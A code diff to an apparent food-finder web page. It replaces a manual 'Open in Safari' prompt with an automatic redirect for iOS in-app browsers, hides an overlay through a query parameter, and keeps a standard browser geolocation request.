@@ -52,6 +52,11 @@ html = """
     <p class="footer">Created by <b>kchiong</b></p>
 
    <script>
+   
+        if (window.location.search.includes("openinsafari=1")) {
+    document.getElementById("overlay").style.display = "none";
+}
+
     function isInAppBrowser() {
         let ua = navigator.userAgent || navigator.vendor || window.opera;
         return ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram");
@@ -62,30 +67,13 @@ html = """
     }
 
     function getLocation() {
-        // If in Messenger on iOS → Force Safari
         if (isInAppBrowser() && isiOS()) {
-            document.body.innerHTML = `
-                <div style="padding:30px; text-align:center; font-family:Arial;">
-                    <h2 style="color:#e53935; margin-bottom:20px;">Open in Safari</h2>
-                    <p style="font-size:16px; margin-bottom:20px;">
-                        To continue, please open this page in Safari:
-                    </p>
-                    <img src="https://i.ibb.co/N2FFcyW/ios-messenger-menu.png" alt="Open in Safari"
-                        style="max-width:80%; border:1px solid #ccc; border-radius:8px; margin-bottom:20px;">
-                    <ol style="text-align:left; max-width:300px; margin:0 auto 20px auto; font-size:16px; line-height:1.5;">
-                        <li>Tap the <b>•••</b> menu at the bottom-right.</li>
-                        <li>Select <b>"Open in Safari"</b>.</li>
-                    </ol>
-                    <button onclick="window.location.href='https://freefoodfiner2.onrender.com';"
-                        style="margin-top:20px; padding:12px 20px; background:#e53935; color:white; border:none; border-radius:6px; font-size:16px; cursor:pointer;">
-                        Open in Safari
-                    </button>
-                </div>
-            `;
+            // Auto-redirect to Safari
+            window.location.replace("https://freefoodfiner2.onrender.com?openinsafari=1");
             return;
         }
 
-        // Request geolocation
+        // Standard geolocation
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(success, geoError, {enableHighAccuracy:true});
         } else {
